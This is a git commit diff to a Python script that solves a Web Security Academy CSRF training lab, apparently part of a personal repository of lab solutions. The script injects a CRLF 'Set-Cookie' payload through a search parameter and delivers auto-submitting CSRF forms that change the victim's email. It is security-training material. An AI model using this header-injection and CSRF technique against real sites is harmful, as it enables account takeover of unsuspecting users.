d2354b9691fe43b9e8cf99be7681bcbf1fc0dc27
Alvin Nguyen <alvinonguyen00@gmail.com>
2024-03-08 21:03:05 -0500

    CSRF where token is duplicated in cookie

--- web_security_academy/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie.py
+++ web_security_academy/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie.py
@@ -1,5 +1,5 @@
 from web_security_academy.core.logger import logger
-from web_security_academy.core.utils import generate_csrf_html
+from web_security_academy.core.utils import generate_csrf_html, readFile
 
 from urllib.parse import urljoin
 from requests import Request
@@ -7,18 +7,15 @@ from requests import Request
 
 def solve_lab(session):
     session.login("wiener", "peter")
-    csrf_key = session.cookies.get("csrfKey")
-    csrf_token = session.get_csrf_token("/my-account?id=wiener")
+    csrf = session.get_csrf_token("/my-account?id=wiener")
 
     exploit_server = session.exploit_server()
     headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
 
-    # Explanation: When using the search functionality, the search term is reflected
-    # in the Set-Cookie response header. However, this function doesn't sanitize the
-    # search term, allowing me to set arbitrary response headers. I exploit this
-    # vulnerability by setting the csrfKey cookie.
+    # Exploiting the arbitrary header injection vulnerability to set the
+    # victim's "csrf" cookie
 
-    data = {"search": f";\r\nSet-Cookie: csrfKey={csrf_key}"}
+    data = {"search": f";\r\nSet-Cookie: csrf={csrf}"}
     req = Request("GET", session.url, data=data)
     body = generate_csrf_html(req)
     exploit_server.deliver_exploit_to_victim("/exploit", headers, body)
@@ -26,7 +23,7 @@ def solve_lab(session):
     req = Request(
         "POST",
         urljoin(session.url, "/my-account/change-email"),
-        data={"email": "user@example.com", "csrf": csrf_token},
+        data={"email": "user@example.com", "csrf": csrf},
     )
     body = generate_csrf_html(req)
     exploit_server.deliver_exploit_to_victim("/exploit", headers, body)
